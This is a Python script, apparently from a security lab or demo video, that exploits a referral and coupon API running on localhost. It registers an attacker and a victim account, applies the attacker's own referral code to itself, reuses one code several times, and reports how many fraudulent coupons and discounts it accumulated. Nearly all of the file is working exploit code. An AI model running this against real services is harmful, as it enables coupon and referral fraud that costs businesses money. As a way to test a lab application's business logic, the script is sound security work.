import time
import requests

BASE_URL = "http://localhost:8091"

# ============= CONFIGURACIÃ“N DE USUARIOS =============
USERS = {
    "attacker": {
        "username": "lvl5_abuserr_video_3",
        "password": "abuser123",
        "phone_number": "158474448",
        "first_name": "Level5",
        "last_name": "Abuser"
    },
    "victim": {
        "username": "lvl5_victimm_video_3",
        "password": "victim123",
        "phone_number": "7411441545",
        "first_name": "Victim",
        "last_name": "User"
    }
}

# NÃºmero de veces que intentaremos aplicar el mismo cÃ³digo
ABUSE_ATTEMPTS = 3

# ============= FUNCIONES AUXILIARES =============
def slow_print(msg, delay=0.8):
    """Imprime mensaje con delay para visualizar el proceso"""
    print(msg)
    time.sleep(delay)

def separator(title=""):
    """Imprime separador visual"""
    print("\n" + "="*70)
    if title:
        print(f"  {title}")
        print("="*70)
    print()

# ============= FUNCIONES DE API =============
def register_user(user_data):
    """Registra un nuevo usuario"""
    slow_print(f"ğŸ“ Registrando: {user_data['username']}", 0.3)
    
    payload = {
        "username": user_data["username"],
        "password": user_data["password"],
        "phone_number": user_data["phone_number"],
        "first_name": user_data["first_name"],
        "last_name": user_data["last_name"]
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/register",
            json=payload,
            headers={"Content-Type": "application/json"}
        )
        
        if r.status_code == 200 or r.status_code == 201:
            slow_print(f"âœ… Usuario creado\n", 0.3)
            return True
        else:
            slow_print(f"âš ï¸  Error en registro: {r.status_code}\n", 0.3)
            return False
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return False

def get_token(username, password):
    """Obtiene token de autenticaciÃ³n"""
    slow_print(f"ğŸ”‘ Obteniendo token: {username}", 0.3)
    
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/token",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        if r.status_code == 200:
            token_data = r.json()
            token = token_data.get("access_token")
            slow_print(f"âœ… Token obtenido\n", 0.3)
            return token
        else:
            slow_print(f"âŒ Error: {r.status_code}\n", 0.3)
            return None
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return None

def get_referral_code(token, username):
    """Obtiene el cÃ³digo de referido del usuario"""
    slow_print(f"ğŸ« Obteniendo cÃ³digo de referido de {username}", 0.3)
    
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        r = requests.get(
            f"{BASE_URL}/referral-code",
            headers=headers
        )
        
        if r.status_code == 200:
            data = r.json()
            code = data.get("code")
            slow_print(f"âœ… CÃ³digo: {code}\n", 0.3)
            return code
        else:
            slow_print(f"âŒ Error: {r.status_code}\n", 0.3)
            return None
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return None

def apply_referral_code(token, referral_code, username, attempt_number=None):
    """Aplica un cÃ³digo de referido"""
    if attempt_number:
        slow_print(f"ğŸ’³ Intento {attempt_number}: Aplicando cÃ³digo {referral_code}", 0.2)
    else:
        slow_print(f"ğŸ’³ {username} aplicando cÃ³digo: {referral_code}", 0.3)
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "referral_code": referral_code
    }
    
    try:
        r = requests.post(
            f"{BASE_URL}/apply-referral",
            json=payload,
            headers=headers
        )
        
        if r.status_code == 200:
            data = r.json()
            slow_print(f"   âœ… Ã‰xito: {data.get('message', 'Aplicado')}", 0.2)
            return True, data
        else:
            error_detail = r.json().get('detail', r.text) if r.text else 'Error desconocido'
            slow_print(f"   âŒ Fallo [{r.status_code}]: {error_detail}", 0.2)
            return False, None
    except Exception as e:
        slow_print(f"   âŒ Error: {str(e)}", 0.2)
        return False, None

def get_discount_coupons(token, username):
    """Obtiene todos los cupones de descuento del usuario"""
    slow_print(f"ğŸŸï¸  Consultando cupones de {username}...", 0.3)
    
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        r = requests.get(
            f"{BASE_URL}/discount-coupons",
            headers=headers
        )
        
        if r.status_code == 200:
            coupons = r.json()
            slow_print(f"âœ… Total: {len(coupons)} cupÃ³n(es)\n", 0.3)
            return coupons
        else:
            slow_print(f"âŒ Error: {r.status_code}\n", 0.3)
            return []
    except Exception as e:
        slow_print(f"âŒ Error: {str(e)}\n", 0.3)
        return []

# ============= SCRIPT PRINCIPAL - EXPLOIT LEVEL 5 =============
def main():
    separator("ğŸš¨ EXPLOIT LEVEL 5 - REFERRAL SYSTEM ABUSE")
    
    slow_print("ğŸ“‹ Vulnerabilidades a explotar:")
    slow_print("   1. API6 - Unrestricted Access (mismo cÃ³digo N veces)")
    slow_print("   2. API2 - Self-Referral (aplicar tu propio cÃ³digo)\n")
    
    # ===== PASO 1: CREAR USUARIOS =====
    separator("PASO 1: Crear usuarios de prueba")
    
    slow_print("ğŸ‘¥ Creando atacante y vÃ­ctima...\n")
    
    if not register_user(USERS["attacker"]):
        slow_print("âŒ Abortando...\n")
        return
    
    if not register_user(USERS["victim"]):
        slow_print("âŒ Abortando...\n")
        return
    
    # ===== PASO 2: OBTENER TOKENS =====
    separator("PASO 2: AutenticaciÃ³n")
    
    attacker_token = get_token(USERS["attacker"]["username"], USERS["attacker"]["password"])
    victim_token = get_token(USERS["victim"]["username"], USERS["victim"]["password"])
    
    if not attacker_token or not victim_token:
        slow_print("âŒ No se obtuvieron los tokens. Abortando...\n")
        return
    
    # ===== PASO 3: OBTENER CÃ“DIGOS DE REFERIDO =====
    separator("PASO 3: Obtener cÃ³digos de referido")
    
    attacker_code = get_referral_code(attacker_token, USERS["attacker"]["username"])
    victim_code = get_referral_code(victim_token, USERS["victim"]["username"])
    
    if not attacker_code or not victim_code:
        slow_print("âŒ No se obtuvieron los cÃ³digos. Abortando...\n")
        return
    
    # ===== PASO 4: ESTADO INICIAL =====
    separator("PASO 4: Estado inicial")
    
    initial_attacker_coupons = get_discount_coupons(attacker_token, USERS["attacker"]["username"])
    initial_victim_coupons = get_discount_coupons(victim_token, USERS["victim"]["username"])
    
    # ===== PASO 5: PROBAR SELF-REFERRAL (VULNERABILIDAD #2) =====
    separator("PASO 5: EXPLOTAR - Self-Referral Attack")
    
    slow_print("âš ï¸  VULNERABILIDAD #2: Aplicar su PROPIO cÃ³digo\n")
    slow_print(f"   {USERS['attacker']['username']} aplicando cÃ³digo: {attacker_code}")
    slow_print(f"   (Este cÃ³digo pertenece a {USERS['attacker']['username']})\n")
    
    self_referral_success, _ = apply_referral_code(
        attacker_token, 
        attacker_code, 
        USERS["attacker"]["username"]
    )
    
    slow_print("")
    
    # ===== PASO 6: APLICACIÃ“N LEGÃTIMA =====
    separator("PASO 6: AplicaciÃ³n legÃ­tima (control)")
    
    slow_print("âœ… Prueba de control: VÃ­ctima aplica cÃ³digo del atacante\n")
    
    legitimate_success, _ = apply_referral_code(
        victim_token,
        attacker_code,
        USERS["victim"]["username"]
    )
    
    slow_print("")
    
    # ===== PASO 7: ABUSO MÃšLTIPLE (VULNERABILIDAD #1) =====
    separator("PASO 7: EXPLOTAR - Multiple Usage Attack")
    
    slow_print("âš ï¸  VULNERABILIDAD #1: Aplicar el MISMO cÃ³digo mÃºltiples veces\n")
    slow_print(f"   VÃ­ctima aplicarÃ¡ el cÃ³digo {attacker_code} {ABUSE_ATTEMPTS} veces\n")
    
    successful_applications = 0
    
    for i in range(1, ABUSE_ATTEMPTS + 1):
        success, _ = apply_referral_code(
            victim_token, 
            attacker_code, 
            USERS["victim"]["username"],
            i
        )
        
        if success:
            successful_applications += 1
        
        time.sleep(0.3)
    
    slow_print(f"\nğŸ“ˆ Aplicaciones exitosas: {successful_applications}/{ABUSE_ATTEMPTS}\n")
    
    # ===== PASO 8: VERIFICAR CUPONES FINALES =====
    separator("PASO 8: AnÃ¡lisis de resultados")
    
    final_attacker_coupons = get_discount_coupons(attacker_token, USERS["attacker"]["username"])
    final_victim_coupons = get_discount_coupons(victim_token, USERS["victim"]["username"])
    
    # Calcular cupones generados
    attacker_new = len(final_attacker_coupons) - len(initial_attacker_coupons)
    victim_new = len(final_victim_coupons) - len(initial_victim_coupons)
    
    slow_print(f"ğŸ“Š RESUMEN DE CUPONES:\n")
    slow_print(f"   {USERS['attacker']['username']}:")
    slow_print(f"      Iniciales: {len(initial_attacker_coupons)}")
    slow_print(f"      Finales:   {len(final_attacker_coupons)}")
    slow_print(f"      Nuevos:    {attacker_new}\n")
    
    slow_print(f"   {USERS['victim']['username']}:")
    slow_print(f"      Iniciales: {len(initial_victim_coupons)}")
    slow_print(f"      Finales:   {len(final_victim_coupons)}")
    slow_print(f"      Nuevos:    {victim_new}\n")
    
    # Calcular descuentos totales
    attacker_discount = sum(c.get("discount_percentage", 0) for c in final_attacker_coupons)
    victim_discount = sum(c.get("discount_percentage", 0) for c in final_victim_coupons)
    
    slow_print(f"ğŸ’° DESCUENTOS ACUMULADOS:\n")
    slow_print(f"   {USERS['attacker']['username']}: {attacker_discount}%")
    slow_print(f"   {USERS['victim']['username']}: {victim_discount}%\n")
    
    # ===== ANÃLISIS DE VULNERABILIDADES =====
    separator("ğŸ“Š VEREDICTO FINAL")
    
    print("\n" + "="*70)
    
    # Verificar vulnerabilidad #2: Self-Referral
    if self_referral_success:
        print("ğŸš¨ VULNERABILIDAD #2 CONFIRMADA: Self-Referral")
        print("="*70)
        slow_print(f"\n   âŒ {USERS['attacker']['username']} aplicÃ³ su PROPIO cÃ³digo")
        slow_print(f"   âŒ No se valida que referrer â‰  applicant")
        slow_print(f"   ğŸ’¸ Impacto: Auto-referenciaciÃ³n sin referir a nadie\n")
    else:
        print("âœ… PROTEGIDO: Self-Referral bloqueado")
        print("="*70)
        slow_print(f"\n   âœ… No se permite aplicar el propio cÃ³digo\n")
    
    # Verificar vulnerabilidad #1: MÃºltiples aplicaciones
    print("\n" + "="*70)
    if successful_applications > 1:
        print("ğŸš¨ VULNERABILIDAD #1 CONFIRMADA: Unrestricted Usage")
        print("="*70)
        slow_print(f"\n   âŒ Se aplicÃ³ el mismo cÃ³digo {successful_applications} veces")
        slow_print(f"   âŒ No hay validaciÃ³n de uso Ãºnico")
        slow_print(f"   âŒ Descuento fraudulento acumulado: {victim_discount}%")
        slow_print(f"   ğŸ’¸ Impacto: PÃ©rdidas econÃ³micas masivas\n")
    else:
        print("âœ… PROTEGIDO: Uso Ãºnico validado")
        print("="*70)
        slow_print(f"\n   âœ… Solo se permite una aplicaciÃ³n por cÃ³digo\n")
    
    # Verificar que la aplicaciÃ³n legÃ­tima funcionÃ³
    if legitimate_success:
        print("\n" + "="*70)
        print("âœ… FUNCIONALIDAD NORMAL: OK")
        print("="*70)
        slow_print(f"\n   âœ… Los referidos legÃ­timos funcionan correctamente\n")
    
    separator("âœ… FIN DEL EXPLOIT LEVEL 5")
    
    slow_print(f"ğŸ’¡ CÃ³digo atacante: {attacker_code}")
    slow_print(f"ğŸ’¡ Cupones fraudulentos totales: {attacker_new + victim_new}\n")

if __name__ == "__main__":
    main()